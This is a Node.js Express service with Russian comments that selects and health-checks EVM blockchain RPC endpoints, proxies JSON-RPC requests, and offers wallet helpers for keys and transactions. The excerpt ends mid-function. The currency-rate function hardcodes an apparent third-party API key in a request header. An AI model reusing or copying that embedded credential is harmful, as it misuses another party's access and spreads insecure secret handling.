const express = require('express');
const axios = require('axios');
const fs = require('fs');
const { ethers } = require('ethers');
const swaggerUi = require('swagger-ui-express');
const swaggerJsdoc = require('swagger-jsdoc');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware для обработки JSON-запросов - должен быть в начале!
app.use(express.json());

// Загружаем алиасы chain_id из JSON-файла
let chainIdAliasesMap = new Map();
let chainIdToAliasesMap = {};

try {
  console.log('Загрузка алиасов chain_id из файла...');
  const aliasesPath = './chain_id_aliases.json';
  
  if (fs.existsSync(aliasesPath)) {
    const aliasesContent = fs.readFileSync(aliasesPath, 'utf8');
    const aliasesData = JSON.parse(aliasesContent);
    
    // Создаем обратное сопоставление: алиас -> chain_id
    Object.keys(aliasesData).forEach(chainId => {
      // Сохраняем сопоставление chain_id -> список алиасов
      chainIdToAliasesMap[chainId] = aliasesData[chainId];
      
      // Создаем сопоставление алиас -> chain_id для быстрого поиска
      aliasesData[chainId].forEach(alias => {
        chainIdAliasesMap.set(alias.toLowerCase(), chainId);
      });
    });
    
    console.log(`Загружено ${chainIdAliasesMap.size} алиасов для ${Object.keys(aliasesData).length} chain_id`);
  } else {
    console.log('Файл с алиасами не найден, создаем новый');
    
    // Создаем базовый набор алиасов
    const basicAliases = {
      "1": ["ethereum", "eth", "mainnet"],
      "56": ["binance", "bsc", "bnb"],
      "137": ["polygon", "matic"],
      "42161": ["arbitrum", "arb"],
      "10": ["optimism", "op"],
      "8453": ["base"],
      "43114": ["avalanche", "avax"]
    };
    
    // Сохраняем базовый набор в файл
    fs.writeFileSync(aliasesPath, JSON.stringify(basicAliases, null, 2), 'utf8');
    
    // Заполняем карту алиасов
    Object.keys(basicAliases).forEach(chainId => {
      // Сохраняем сопоставление chain_id -> список алиасов
      chainIdToAliasesMap[chainId] = basicAliases[chainId];
      
      // Создаем сопоставление алиас -> chain_id для быстрого поиска
      basicAliases[chainId].forEach(alias => {
        chainIdAliasesMap.set(alias.toLowerCase(), chainId);
      });
    });
    
    console.log(`Создан базовый набор из ${chainIdAliasesMap.size} алиасов для ${Object.keys(basicAliases).length} chain_id`);
  }
} catch (err) {
  console.error('Ошибка при загрузке алиасов chain_id:', err.message);
  // Создаем пустые структуры в случае ошибки
  chainIdAliasesMap = new Map();
  chainIdToAliasesMap = {};
}

// Функция для нормализации chain_id (поддержка алиасов)
function normalizeChainId(chainId) {
  if (!chainId) return null;
  
  // Приводим к строке и нижнему регистру для алиасов
  const chainIdStr = String(chainId).toLowerCase();
  
  // Проверяем, есть ли алиас в карте
  if (chainIdAliasesMap.has(chainIdStr)) {
    const normalizedId = chainIdAliasesMap.get(chainIdStr);
    console.log(`Алиас ${chainIdStr} преобразован в chain_id=${normalizedId}`);
    return normalizedId;
  }
  
  // Если это не алиас, возвращаем как есть
  return chainIdStr;
}

// Загружаем список приоритетных RPC-узлов
let priorityRpcList;
try {
  // Загружаем приоритетные RPC из файла
  const priorityRpcContent = fs.readFileSync('./priority_rpcs.json', 'utf8');
  priorityRpcList = JSON.parse(priorityRpcContent);
  console.log('Загружен список приоритетных RPC');
} catch (err) {
  console.log('Файл с приоритетными RPC не найден, создаем новый');
  priorityRpcList = {};
  
  // Сохраняем приоритетные RPC из предоставленного списка
  try {
    const priorityRpcData = fs.readFileSync('pasted_content.txt', 'utf8');
    priorityRpcList = JSON.parse(priorityRpcData);
    fs.writeFileSync('./priority_rpcs.json', JSON.stringify(priorityRpcList, null, 2), 'utf8');
    console.log('Создан новый файл с приоритетными RPC');
  } catch (priorityErr) {
    console.error('Ошибка при создании файла с приоритетными RPC:', priorityErr.message);
  }
}

// Загружаем список RPC-узлов из JSON-файла или из переменной окружения
let rpcList = {};
try {
  // Пробуем загрузить из файла
  if (fs.existsSync('./rpcs.json')) {
    rpcList = JSON.parse(fs.readFileSync('./rpcs.json', 'utf8'));
    console.log('Загружен основной список RPC из файла');
  } else if (process.env.RPC_LIST) {
    try {
      rpcList = JSON.parse(process.env.RPC_LIST);
      console.log('Загружен основной список RPC из переменной окружения');
    } catch (parseErr) {
      console.error('Ошибка парсинга RPC_LIST:', parseErr.message);
    }
  } else {
    console.log('Не удалось загрузить список RPC из локальных источников. Будет использован только приоритетный список.');
  }
} catch (err) {
  console.error('Ошибка при загрузке основного списка RPC:', err.message);
}

// Объединяем приоритетные RPC с основным списком
function mergeRpcLists() {
  console.log('Объединение списков RPC...');
  
  // Создаем копию основного списка
  const mergedList = JSON.parse(JSON.stringify(rpcList));
  
  // Добавляем приоритетные RPC в начало списков для каждого chain_id
  Object.keys(priorityRpcList).forEach(chainId => {
    if (!mergedList[chainId]) {
      mergedList[chainId] = [];
    }
    
    // Добавляем приоритетные RPC, избегая дубликатов
    priorityRpcList[chainId].forEach(rpc => {
      // Удаляем RPC из основного списка, если он там есть
      const index = mergedList[chainId].indexOf(rpc);
      if (index !== -1) {
        mergedList[chainId].splice(index, 1);
      }
    });
    
    // Добавляем приоритетные RPC в начало списка
    mergedList[chainId] = [...priorityRpcList[chainId], ...mergedList[chainId]];
  });
  
  console.log(`Объединенный список содержит ${Object.keys(mergedList).length} chain_id`);
  return mergedList;
}

// Кэш для хранения нерабочих RPC с временем их последней проверки
const failedRpcs = new Map();
// Кэш для хранения результатов проверки методов RPC
const rpcMethodsSupport = new Map();
// Кэш для хранения курсов валют
const currencyRates = new Map();
// Кэш для хранения цен газа
const gasPrices = new Map();

const RETRY_TIMEOUT = parseInt(process.env.RETRY_TIMEOUT) || 5 * 60 * 1000; // 5 минут до повторной проверки
const CHECK_INTERVAL = parseInt(process.env.CHECK_INTERVAL) || 15 * 60 * 1000; // Интервал проверки всех RPC (15 минут)
const REQUEST_TIMEOUT = parseInt(process.env.REQUEST_TIMEOUT) || 5000; // Таймаут запроса (5 секунд)
const CURRENCY_CACHE_TIMEOUT = parseInt(process.env.CURRENCY_CACHE_TIMEOUT) || 5 * 60 * 1000; // 5 минут кэширования курсов
const GAS_PRICE_CACHE_TIMEOUT = parseInt(process.env.GAS_PRICE_CACHE_TIMEOUT) || 1 * 60 * 1000; // 1 минута кэширования цен газа

// Функция для загрузки данных RPC из внешних источников
async function loadRpcDataFromExternalSources() {
  try {
    console.log('Загрузка RPC данных из внешних источников...');
    
    // Загрузка данных из chainlist.org
    try {
      const chainlistResponse = await axios.get('https://chainlist.org/rpcs.json', { timeout: 10000 });
      const chainlistData = chainlistResponse.data;
      
      // Обработка данных из chainlist.org
      if (chainlistData && typeof chainlistData === 'object') {
        Object.keys(chainlistData).forEach(chainId => {
          if (!rpcList[chainId]) {
            rpcList[chainId] = [];
          }
          
          // Добавляем новые RPC, избегая дубликатов
          chainlistData[chainId].forEach(rpc => {
            if (!rpcList[chainId].includes(rpc)) {
              rpcList[chainId].push(rpc);
            }
          });
        });
        console.log('Данные из chainlist.org успешно загружены');
      }
    } catch (chainlistError) {
      console.error('Ошибка при загрузке данных из chainlist.org:', chainlistError.message);
    }
    
    // Получаем список всех chain ID из текущего списка для загрузки данных из ethereum-lists/chains
    const chainIds = new Set([...Object.keys(rpcList), ...Object.keys(priorityRpcList)]);
    
    // Добавляем популярные сети, если их нет в списке
    const popularChains = ['1', '56', '137', '42161', '10', '8453', '43114'];
    popularChains.forEach(id => chainIds.add(id));
    
    console.log(`Загрузка данных для ${chainIds.size} chain ID из ethereum-lists/chains...`);
    
    // Загрузка данных из ethereum-lists/chains для каждого chain ID
    for (const chainId of chainIds) {
      try {
        const url = `https://raw.githubusercontent.com/ethereum-lists/chains/refs/heads/master/_data/chains/eip155-${chainId}.json`;
        const response = await axios.get(url, { timeout: 5000 });
        const chainData = response.data;
        
        if (chainData && chainData.rpc && Array.isArray(chainData.rpc)) {
          if (!rpcList[chainId]) {
            rpcList[chainId] = [];
          }
          
          // Очищаем URL от параметров авторизации и других чувствительных данных
          const cleanRpcs = chainData.rpc.map(rpc => {
            // Удаляем параметры API ключей из URL
            return rpc.replace(/\${[^}]+}/g, '').replace(/\$\{[^}]+\}/g, '').replace(/:[^@]*@/, ':@');
          }).filter(rpc => {
            // Фильтруем пустые URL или URL с незаполненными параметрами
            return rpc && !rpc.includes('${') && !rpc.includes('$\{') && !rpc.includes(':@');
          });
          
          // Добавляем новые RPC, избегая дубликатов
          cleanRpcs.forEach(rpc => {
            if (!rpcList[chainId].includes(rpc)) {
              rpcList[chainId].push(rpc);
            }
          });
          console.log(`Загружены данные для chain ID ${chainId}: ${cleanRpcs.length} RPC`);
        }
      } catch (error) {
        console.error(`Ошибка при загрузке данных для chain ID ${chainId}:`, error.message);
      }
    }
    
    // Сохраняем обновленный список RPC в файл
    fs.writeFileSync('./rpcs.json', JSON.stringify(rpcList, null, 2), 'utf8');
    console.log('Данные RPC успешно загружены и сохранены');
    
    return true;
  } catch (error) {
    console.error('Ошибка при загрузке данных RPC из внешних источников:', error.message);
    return false;
  }
}

// Функция для тестирования RPC на возможность отправки транзакций
async function testRpcTransactionSupport(rpcUrl) {
  console.log(`Тестирование поддержки транзакций для ${rpcUrl}...`);
  try {
    // Проверяем поддержку метода eth_sendRawTransaction
    const response = await axios.post(rpcUrl, {
      jsonrpc: '2.0',
      method: 'eth_sendRawTransaction',
      // Отправляем некорректную транзакцию, чтобы проверить только поддержку метода
      params: ['0x0123'],
      id: 1
    }, {
      headers: {
        'Content-Type': 'application/json'
      },
      timeout: REQUEST_TIMEOUT
    });
    
    // Если RPC поддерживает метод, он должен вернуть ошибку о некорректной транзакции,
    // но не ошибку о неподдерживаемом методе
    if (response.data.error) {
      const errorMessage = response.data.error.message || '';
      // Проверяем, что ошибка связана с форматом транзакции, а не с поддержкой метода
      if (errorMessage.toLowerCase().includes('method not found') || 
          errorMessage.toLowerCase().includes('method not supported') ||
          errorMessage.toLowerCase().includes('not implemented')) {
        console.log(`RPC ${rpcUrl} не поддерживает отправку транзакций: ${errorMessage}`);
        throw new Error('Метод отправки транзакций не поддерживается');
      }
      // Если ошибка связана с форматом транзакции, значит метод поддерживается
      console.log(`RPC ${rpcUrl} поддерживает отправку транзакций`);
      return true;
    }
    
    console.log(`RPC ${rpcUrl} поддерживает отправку транзакций`);
    return true;
  } catch (error) {
    // Проверяем сообщение об ошибке
    if (error.response && error.response.data && error.response.data.error) {
      const errorMessage = error.response.data.error.message || '';
      if (errorMessage.toLowerCase().includes('method not found') || 
          errorMessage.toLowerCase().includes('method not supported') ||
          errorMessage.toLowerCase().includes('not implemented')) {
        console.log(`RPC ${rpcUrl} не поддерживает отправку транзакций: ${errorMessage}`);
        throw new Error('Метод отправки транзакций не поддерживается');
      }
      // Если ошибка связана с форматом транзакции, значит метод поддерживается
      console.log(`RPC ${rpcUrl} поддерживает отправку транзакций (ошибка формата)`);
      return true;
    }
    
    // Если произошла ошибка соединения или таймаут, считаем RPC недоступным
    console.error(`Ошибка при проверке поддержки транзакций для ${rpcUrl}:`, error.message);
    throw error;
  }
}

// Функция для проверки поддержки различных методов RPC
async function testRpcMethodSupport(rpcUrl, method, params = []) {
  console.log(`Тестирование метода ${method} для ${rpcUrl}...`);
  
  // Проверяем, есть ли результат в кэше
  const cacheKey = `${rpcUrl}:${method}`;
  const cachedResult = rpcMethodsSupport.get(cacheKey);
  
  if (cachedResult && cachedResult.timestamp > Date.now() - RETRY_TIMEOUT) {
    if (cachedResult.supported) {
      console.log(`RPC ${rpcUrl} поддерживает метод ${method} (из кэша)`);
      return true;
    } else {
      console.log(`RPC ${rpcUrl} не поддерживает метод ${method} (из кэша)`);
      throw new Error(`Метод ${method} не поддерживается (из кэша)`);
    }
  }
  
  try {
    const response = await axios.post(rpcUrl, {
      jsonrpc: '2.0',
      method: method,
      params: params,
      id: 1
    }, {
      headers: {
        'Content-Type': 'application/json'
      },
      timeout: REQUEST_TIMEOUT
    });
    
    // Проверяем наличие ошибки о неподдерживаемом методе
    if (response.data.error) {
      const errorMessage = response.data.error.message || '';
      if (errorMessage.toLowerCase().includes('method not found') || 
          errorMessage.toLowerCase().includes('method not supported') ||
          errorMessage.toLowerCase().includes('not implemented')) {
        // Сохраняем результат в кэш
        rpcMethodsSupport.set(cacheKey, {
          supported: false,
          timestamp: Date.now()
        });
        console.log(`RPC ${rpcUrl} не поддерживает метод ${method}: ${errorMessage}`);
        throw new Error(`Метод ${method} не поддерживается`);
      }
    }
    
    // Проверяем корректность ответа для некоторых методов
    if (method === 'eth_getBalance') {
      if (!response.data.result || typeof response.data.result !== 'string' || !response.data.result.startsWith('0x')) {
        console.log(`RPC ${rpcUrl} вернул некорректный ответ для метода ${method}`);
        throw new Error(`Некорректный ответ для метода ${method}`);
      }
    }
    
    // Сохраняем результат в кэш
    rpcMethodsSupport.set(cacheKey, {
      supported: true,
      timestamp: Date.now()
    });
    
    console.log(`RPC ${rpcUrl} успешно поддерживает метод ${method}`);
    return true;
  } catch (error) {
    // Проверяем сообщение об ошибке
    if (error.response && error.response.data && error.response.data.error) {
      const errorMessage = error.response.data.error.message || '';
      if (errorMessage.toLowerCase().includes('method not found') || 
          errorMessage.toLowerCase().includes('method not supported') ||
          errorMessage.toLowerCase().includes('not implemented')) {
        // Сохраняем результат в кэш
        rpcMethodsSupport.set(cacheKey, {
          supported: false,
          timestamp: Date.now()
        });
        console.log(`RPC ${rpcUrl} не поддерживает метод ${method}: ${errorMessage}`);
        throw new Error(`Метод ${method} не поддерживается`);
      }
    }
    
    // Если произошла другая ошибка (не связанная с поддержкой метода), пропускаем
    console.error(`Ошибка при проверке метода ${method} для ${rpcUrl}:`, error.message);
    throw error;
  }
}

// Функция для базовой проверки доступности RPC
async function testRpcAvailability(rpcUrl) {
  console.log(`Проверка доступности ${rpcUrl}...`);
  try {
    const response = await axios.post(rpcUrl, {
      jsonrpc: '2.0',
      method: 'eth_blockNumber',
      params: [],
      id: 1
    }, {
      headers: {
        'Content-Type': 'application/json'
      },
      timeout: REQUEST_TIMEOUT
    });
    
    if (response.data.error) {
      console.log(`RPC ${rpcUrl} вернул ошибку:`, response.data.error);
      throw new Error(`RPC вернул ошибку: ${response.data.error.message}`);
    }
    
    console.log(`RPC ${rpcUrl} доступен, текущий блок: ${response.data.result}`);
    return true;
  } catch (error) {
    console.error(`Ошибка при проверке доступности ${rpcUrl}:`, error.message);
    throw error;
  }
}

// Функция для тестирования RPC с проверкой поддержки транзакций и методов
async function testRpc(rpcUrl, checkTx = false, checkMethods = false) {
  console.log(`Тестирование RPC ${rpcUrl} (checkTx=${checkTx}, checkMethods=${checkMethods})...`);
  
  try {
    // Базовая проверка доступности
    await testRpcAvailability(rpcUrl);
    
    // Проверка поддержки транзакций, если требуется
    if (checkTx) {
      await testRpcTransactionSupport(rpcUrl);
    }
    
    // Проверка поддержки методов, если требуется
    if (checkMethods) {
      // Проверяем поддержку основных методов
      await testRpcMethodSupport(rpcUrl, 'eth_getBalance', ['0x0000000000000000000000000000000000000000', 'latest']);
      await testRpcMethodSupport(rpcUrl, 'eth_gasPrice', []);
      await testRpcMethodSupport(rpcUrl, 'eth_estimateGas', [{
        to: '0x0000000000000000000000000000000000000000',
        value: '0x0'
      }]);
    }
    
    console.log(`RPC ${rpcUrl} успешно прошел все проверки`);
    return true;
  } catch (error) {
    console.error(`RPC ${rpcUrl} не прошел проверку:`, error.message);
    throw error;
  }
}

// Функция для получения доступных RPC для указанного chain_id
function getAvailableRpcs(normalizedChainId, mergedRpcList) {
  console.log(`Получение доступных RPC для chain_id=${normalizedChainId}...`);
  
  if (!mergedRpcList[normalizedChainId] || mergedRpcList[normalizedChainId].length === 0) {
    console.log(`RPC для chain_id=${normalizedChainId} не найдены`);
    return [];
  }
  
  console.log(`Всего RPC для chain_id=${normalizedChainId}: ${mergedRpcList[normalizedChainId].length}`);
  
  // Фильтруем только рабочие RPC или те, которые стоит проверить снова
  const availableRpcs = mergedRpcList[normalizedChainId].filter(rpc => {
    const failedInfo = failedRpcs.get(rpc);
    const isAvailable = !failedInfo || (Date.now() - failedInfo.timestamp > RETRY_TIMEOUT);
    if (!isAvailable) {
      console.log(`RPC ${rpc} пропущен из-за недавней ошибки: ${failedInfo.error}`);
    }
    return isAvailable;
  });
  
  console.log(`Доступных RPC для chain_id=${normalizedChainId}: ${availableRpcs.length}`);
  return availableRpcs;
}

// Функция для получения работающего RPC для указанного chain_id
async function getWorkingRpc(chainId) {
  // Нормализуем chain_id (поддержка алиасов)
  const normalizedChainId = normalizeChainId(chainId);
  
  // Получаем объединенный список RPC с учетом приоритетов
  const mergedRpcList = mergeRpcLists();
  
  // Получаем доступные RPC
  const availableRpcs = getAvailableRpcs(normalizedChainId, mergedRpcList);
  
  if (availableRpcs.length === 0) {
    throw new Error(`Нет доступных RPC для chain_id=${normalizedChainId}`);
  }
  
  // Перебираем RPC, пока не найдем работающий
  for (const rpc of availableRpcs) {
    try {
      await testRpcAvailability(rpc);
      return rpc;
    } catch (error) {
      // Помечаем RPC как неработающий
      failedRpcs.set(rpc, { 
        timestamp: Date.now(),
        error: error.message
      });
      console.error(`RPC не работает: ${rpc}`, error.message);
      // Продолжаем перебор
    }
  }
  
  // Если все RPC недоступны
  throw new Error(`Все доступные RPC недоступны для chain_id=${normalizedChainId}`);
}

// Функция для получения адреса из private key
function getAddressFromPrivateKey(privateKey) {
  try {
    // Проверяем, начинается ли приватный ключ с 0x
    if (!privateKey.startsWith('0x')) {
      privateKey = '0x' + privateKey;
    }
    
    const wallet = new ethers.Wallet(privateKey);
    return wallet.address;
  } catch (error) {
    throw new Error(`Ошибка при получении адреса из приватного ключа: ${error.message}`);
  }
}

// Функция для получения адреса из mnemonic
function getAddressFromMnemonic(mnemonic) {
  try {
    const wallet = ethers.Wallet.fromMnemonic(mnemonic);
    return wallet.address;
  } catch (error) {
    throw new Error(`Ошибка при получении адреса из мнемоники: ${error.message}`);
  }
}

// Функция для получения баланса адреса
async function getBalance(address, rpcUrl) {
  try {
    const response = await axios.post(rpcUrl, {
      jsonrpc: '2.0',
      method: 'eth_getBalance',
      params: [address, 'latest'],
      id: 1
    }, {
      headers: {
        'Content-Type': 'application/json'
      },
      timeout: REQUEST_TIMEOUT
    });
    
    if (response.data.error) {
      throw new Error(`RPC вернул ошибку: ${response.data.error.message}`);
    }
    
    return response.data.result;
  } catch (error) {
    throw new Error(`Ошибка при получении баланса: ${error.message}`);
  }
}

// Функция для получения цены газа
async function getGasPrice(rpcUrl) {
  try {
    // Проверяем, есть ли результат в кэше
    const cachedPrice = gasPrices.get(rpcUrl);
    if (cachedPrice && cachedPrice.timestamp > Date.now() - GAS_PRICE_CACHE_TIMEOUT) {
      console.log(`Цена газа для ${rpcUrl} получена из кэша: ${cachedPrice.price}`);
      return cachedPrice.price;
    }
    
    const response = await axios.post(rpcUrl, {
      jsonrpc: '2.0',
      method: 'eth_gasPrice',
      params: [],
      id: 1
    }, {
      headers: {
        'Content-Type': 'application/json'
      },
      timeout: REQUEST_TIMEOUT
    });
    
    if (response.data.error) {
      throw new Error(`RPC вернул ошибку: ${response.data.error.message}`);
    }
    
    // Сохраняем результат в кэш
    gasPrices.set(rpcUrl, {
      price: response.data.result,
      timestamp: Date.now()
    });
    
    return response.data.result;
  } catch (error) {
    throw new Error(`Ошибка при получении цены газа: ${error.message}`);
  }
}

// Функция для оценки газа для транзакции
async function estimateGas(from, to, value, rpcUrl) {
  try {
    const response = await axios.post(rpcUrl, {
      jsonrpc: '2.0',
      method: 'eth_estimateGas',
      params: [{
        from: from,
        to: to,
        value: value
      }],
      id: 1
    }, {
      headers: {
        'Content-Type': 'application/json'
      },
      timeout: REQUEST_TIMEOUT
    });
    
    if (response.data.error) {
      throw new Error(`RPC вернул ошибку: ${response.data.error.message}`);
    }
    
    return response.data.result;
  } catch (error) {
    throw new Error(`Ошибка при оценке газа: ${error.message}`);
  }
}

// Функция для получения курсов валют
async function getCurrencyRates() {
  try {
    // Проверяем, есть ли результат в кэше
    const cachedRates = currencyRates.get('rates');
    if (cachedRates && cachedRates.timestamp > Date.now() - CURRENCY_CACHE_TIMEOUT) {
      console.log('Курсы валют получены из кэша');
      return cachedRates.rates;
    }
    
    const response = await axios.get('https://ratios.wallet.brave.com/v2/relative/provider/coingecko/eth,scroll,linea,moonbeam,aurora,mantle,okx,core,unichain,matic,bnb,op,base,fantom,gnosis,avax,polygon,arbitrum,cronos,zksync,core,pulsechain,blast,moonriver,celo/usd/live', {
      headers: {
        'x-brave-key': 'qztbjzBqJueQZLFkwTTJrieu8Vw3789u'
      },
      timeout: 10000
    });
    
    if (!response.data || !response.data.payload) {
      throw new Error('Некорректный ответ от API курсов валют');
    }
    
    // Сохраняем результат в кэш
    currencyRates.set('rates', {
      rates: response.data.payload,
      timestamp: Date.now()
    });
    
    return response.data.payload;
  } catch (error) {
    throw new Error(`Ошибка при получении курсов валют: ${error.message}`);
  }
}

// Функция для конвертации hex в decimal
function hexToDecimal(hex) {
  return ethers.BigNumber.from(hex).toString();
}

// Функция для конвертации decimal в hex
function decimalToHex(decimal) {
  return ethers.BigNumber.from(decimal).toHexString();
}

// Функция для конвертации wei в ether
function weiToEther(wei) {
  return ethers.utils.formatEther(wei);
}

// Функция для конвертации ether в wei
function etherToWei(ether) {
  return ethers.utils.parseEther(ether).toString();
}

// Функция для отправки транзакции
async function sendTransaction(privateKey, to, value, gasPrice, rpcUrl) {
  try {
    // Создаем провайдер и кошелек
    const provider = new ethers.providers.JsonRpcProvider(rpcUrl);
    const wallet = new ethers.Wallet(privateKey, provider);
    
    // Создаем транзакцию
    const tx = {
      to: to,
      value: ethers.BigNumber.from(value)
    };
    
    // Если указана цена газа, добавляем ее
    if (gasPrice) {
      tx.gasPrice = ethers.BigNumber.from(gasPrice);
    }
    
    // Отправляем транзакцию
    const txResponse = await wallet.sendTransaction(tx);
    
    // Ждем подтверждения
    const receipt = await txResponse.wait();
    
    return {
      hash: txResponse.hash,
      blockNumber: receipt.blockNumber,
      gasUsed: receipt.gasUsed.toString(),
      status: receipt.status === 1 ? 'success' : 'failed'
    };
  } catch (error) {
    throw new Error(`Ошибка при отправке транзакции: ${error.message}`);
  }
}

// Swagger конфигурация
const swaggerOptions = {
  definition: {
    openapi: '3.0.0',
    info: {
      title: 'RPC API',
      version: '1.0.0',
      description: 'API для работы с RPC и блокчейн-сетями',
    },
    servers: [
      {
        url: `http://localhost:${PORT}`,
        description: 'Локальный сервер',
      },
    ],
  },
  apis: ['./server.js'], // Путь к файлам с JSDoc комментариями
};

const swaggerSpec = swaggerJsdoc(swaggerOptions);
app.use('/api-docs', swaggerUi.serve, swaggerUi.setup(swaggerSpec));

/**
 * @swagger
 * /rpc:
 *   get:
 *     summary: Получить доступный RPC для указанного chain_id
 *     parameters:
 *       - in: query
 *         name: chain_id
 *         required: true
 *         schema:
 *           type: string
 *         description: ID блокчейн-сети или алиас (например, 1, eth, ethereum)
 *       - in: query
 *         name: check_tx
 *         schema:
 *           type: boolean
 *         description: Проверять поддержку отправки транзакций
 *       - in: query
 *         name: check_methods
 *         schema:
 *           type: boolean
 *         description: Проверять поддержку основных методов
 *     responses:
 *       200:
 *         description: Успешный ответ с доступным RPC
 *         content:
 *           application/json:
 *             schema:
 *               type: object
 *               properties:
 *                 rpc:
 *                   type: string
 *       400:
 *         description: Ошибка в запросе
 *       503:
 *         description: Нет доступных RPC
 */
app.get('/rpc', async (req, res) => {
  const chainId = req.query.chain_id;
  const checkTx = req.query.check_tx === 'true'; // Параметр для проверки поддержки транзакций
  const checkMethods = req.query.check_methods === 'true'; // Параметр для проверки поддержки методов
  
  console.log(`Запрос /rpc для chain_id=${chainId}, checkTx=${checkTx}, checkMethods=${checkMethods}`);
  
  if (!chainId) {
    console.log('Ошибка: chain_id не указан');
    return res.status(400).json({ error: 'Необходимо указать chain_id' });
  }
  
  // Нормализуем chain_id (поддержка алиасов)
  const normalizedChainId = normalizeChainId(chainId);
  
  // Получаем объединенный список RPC с учетом приоритетов
  const mergedRpcList = mergeRpcLists();
  
  // Получаем доступные RPC
  const availableRpcs = getAvailableRpcs(normalizedChainId, mergedRpcList);
  
  if (availableRpcs.length === 0) {
    console.log(`Ошибка: нет доступных RPC для chain_id=${normalizedChainId}`);
    return res.status(503).json({ error: 'Нет доступных RPC для данной сети' });
  }
  
  // Выбираем первый RPC из доступных (с учетом приоритета)
  const selectedRpc = availableRpcs[0];
  console.log(`Выбран RPC: ${selectedRpc}`);
  
  try {
    // Тестируем RPC с проверкой поддержки транзакций и методов, если требуется
    await testRpc(selectedRpc, checkTx, checkMethods);
    
    // Если тест успешен, возвращаем RPC
    console.log(`Успешно проверен RPC: ${selectedRpc}`);
    return res.json({ rpc: selectedRpc });
  } catch (error) {
    console.error(`RPC не работает: ${selectedRpc}`, error.message);
    
    // Помечаем RPC как неработающий
    failedRpcs.set(selectedRpc, { 
      timestamp: Date.now(),
      error: error.message
    });
    
    // Пробуем другой RPC, если есть
    if (availableRpcs.length > 1) {
      console.log(`Пробуем другие RPC из списка (осталось ${availableRpcs.length - 1})`);
      
      // Перебираем оставшиеся RPC по порядку (с учетом приоритета)
      for (let i = 1; i < availableRpcs.length; i++) {
        const nextRpc = availableRpcs[i];
        console.log(`Пробуем RPC: ${nextRpc}`);
        
        try {
          await testRpc(nextRpc, checkTx, checkMethods);
          console.log(`Успешно проверен RPC: ${nextRpc}`);
          return res.json({ rpc: nextRpc });
        } catch (error) {
          failedRpcs.set(nextRpc, { 
            timestamp: Date.now(),
            error: error.message
          });
          console.error(`RPC не работает: ${nextRpc}`, error.message);
          // Продолжаем перебор
        }
      }
      // Если все RPC недоступны
      console.log(`Ошибка: все доступные RPC недоступны для chain_id=${normalizedChainId}`);
      return res.status(503).json({ error: 'Все доступные RPC недоступны' });
    } else {
      console.log(`Ошибка: все доступные RPC недоступны для chain_id=${normalizedChainId}`);
      return res.status(503).json({ error: 'Все доступные RPC недоступны' });
    }
  }
});

/**
 * @swagger
 * /rpc_d:
 *   all:
 *     summary: Прокси для RPC запросов
 *     parameters:
 *       - in: query
 *         name: chain_id
 *         required: true
 *         schema:
 *           type: string
 *         description: ID блокчейн-сети или алиас (например, 1, eth, ethereum)
 *     requestBody:
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             properties:
 *               jsonrpc:
 *                 type: string
 *               method:
 *                 type: string
 *               params:
 *                 type: array
 *               id:
 *                 type: integer
 *     responses:
 *       200:
 *         description: Ответ от RPC
 *       400:
 *         description: Ошибка в запросе
 *       503:
 *         description: Нет доступных RPC
 */
app.all('/rpc_d', async (req, res) => {
  const chainId = req.query.chain_id;
  
  console.log(`Запрос /rpc_d для chain_id=${chainId}, метод=${req.method}`);
  console.log('Тело запроса:', JSON.stringify(req.body));
  
  if (!chainId) {
    console.log('Ошибка: chain_id не указан');
    return res.status(400).json({ error: 'Необходимо указать chain_id' });
  }
  
  // Нормализуем chain_id (поддержка алиасов)
  const normalizedChainId = normalizeChainId(chainId);
  
  // Получаем объединенный список RPC с учетом приоритетов
  const mergedRpcList = mergeRpcLists();
  
  // Получаем доступные RPC
  const availableRpcs = getAvailableRpcs(normalizedChainId, mergedRpcList);
  
  if (availableRpcs.length === 0) {
    console.log(`Ошибка: нет доступных RPC для chain_id=${normalizedChainId}`);
    return res.status(503).json({ error: 'Нет доступных RPC для данной сети' });
  }
  
  // Получаем метод из тела запроса для проверки поддержки
  let requestMethod = 'eth_blockNumber'; // По умолчанию
  let requestParams = [];
  
  try {
    if (req.body && req.body.method) {
      requestMethod = req.body.method;
      requestParams = req.body.params || [];
      console.log(`Запрошенный метод: ${requestMethod}, параметры:`, requestParams);
    }
  } catch (e) {
    console.error('Ошибка при получении метода из тела запроса:', e.message);
  }
  
  // Выбираем первый RPC из доступных (с учетом приоритета)
  const selectedRpc = availableRpcs[0];
  console.log(`Выбран RPC для прокси: ${selectedRpc}`);
  
  try {
    // Базовая проверка доступности
    await testRpcAvailability(selectedRpc);
    
    // Получаем тело запроса и заголовки
    const requestBody = req.body;
    const contentType = req.headers['content-type'] || 'application/json';
    
    console.log(`Проксирование запроса к ${selectedRpc}...`);
    
    // Проксируем запрос к выбранному RPC
    const proxyResponse = await axios({
      method: req.method,
      url: selectedRpc,
      data: requestBody,
      headers: {
        'Content-Type': contentType
      },
      timeout: REQUEST_TIMEOUT * 2 // Увеличиваем таймаут для прокси-запросов
    });
    
    console.log(`Получен ответ от ${selectedRpc}:`, proxyResponse.data);
    
    // Возвращаем ответ от RPC
    return res.status(proxyResponse.status).json(proxyResponse.data);
  } catch (error) {
    console.error(`Ошибка при проксировании запроса к RPC ${selectedRpc}:`, error.message);
    
    // Помечаем RPC как неработающий
    failedRpcs.set(selectedRpc, { 
      timestamp: Date.now(),
      error: error.message
    });
    
    // Пробуем другие RPC по порядку, если есть
    if (availableRpcs.length > 1) {
      console.log(`Пробуем другие RPC из списка для прокси (осталось ${availableRpcs.length - 1})`);
      
      // Перебираем оставшиеся RPC по порядку (с учетом приоритета)
      for (let i = 1; i < availableRpcs.length; i++) {
        const nextRpc = availableRpcs[i];
        console.log(`Пробуем RPC для прокси: ${nextRpc}`);
        
        try {
          // Базовая проверка доступности
          await testRpcAvailability(nextRpc);
          
          // Получаем тело запроса и заголовки
          const requestBody = req.body;
          const contentType = req.headers['content-type'] || 'application/json';
          
          console.log(`Проксирование запроса к ${nextRpc}...`);
          
          // Проксируем запрос к новому выбранному RPC
          const proxyResponse = await axios({
            method: req.method,
            url: nextRpc,
            data: requestBody,
            headers: {
              'Content-Type': contentType
            },
            timeout: REQUEST_TIMEOUT * 2
          });
          
          console.log(`Получен ответ от ${nextRpc}:`, proxyResponse.data);
          
          // Возвращаем ответ от RPC
          return res.status(proxyResponse.status).json(proxyResponse.data);
        } catch (error) {
          failedRpcs.set(nextRpc, { 
            timestamp: Date.now(),
            error: error.message
          });
